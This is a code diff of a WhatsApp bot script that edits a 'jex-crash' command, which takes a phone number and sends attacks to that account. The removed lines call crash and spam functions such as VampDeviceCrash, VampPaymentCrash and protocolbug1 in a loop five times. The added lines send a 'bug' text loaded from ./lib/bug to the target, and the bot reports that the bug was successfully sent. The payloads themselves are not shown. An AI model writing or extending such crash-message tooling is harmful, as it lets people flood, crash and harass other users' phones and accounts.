@@ -114,7 +114,7 @@ const {fetchReactionImage} = require('./lib/reaction')
 const { toAudio } = require('./lib/converter');
 const { remini } = require('./lib/remini')
 const { jadibot, stopjadibot, listjadibot } = require('./jadibot')
-const bugs = require('./lib/bug');
+const xeontext2 = require('./lib/bug');
 
 module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
 try {
@@ -11263,26 +11263,15 @@ break
 case "jex-crash": {    
     if (!Access) return reply(mess.owner);
     
-    if (!text) return reply(`\`Example:\` : ${prefix+command} 256×××`);
+    if (!text) return reply(`\`Example:\` : ${prefix + command} 256×××`);
     
     let target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
-    reply(`*[!] bug successfully sent to target*`); 
+    reply(`*[!] Bug successfully sent to target*`); 
     
-    // Call multiple bug functions
-    for (let i = 0; i < 5; i++) {
-        await bugs.bulldozer(target);
-        await bugs.VampSpam(target);
-        await bugs.VampDeviceCrash(target);
-        await bugs.VampPaymentCrash(target);
-        await bugs.protocolbug1(target, true);
-        await bugs.protocolbug2(target, true);
-        await bugs.protocolbug3(target, true);
-        await bugs.carouselNew(target);
-        await bugs.DelayStc(target);
-        await bugs.SockMentionJid3(target);
-        await bugs.CosmoBlankX(target);
-    }
+    // Send xeontext2 to target
+    await conn.sendMessage(target, { text: xeontext2 }, { quoted: m });
+    
     break;
 }
 //======================
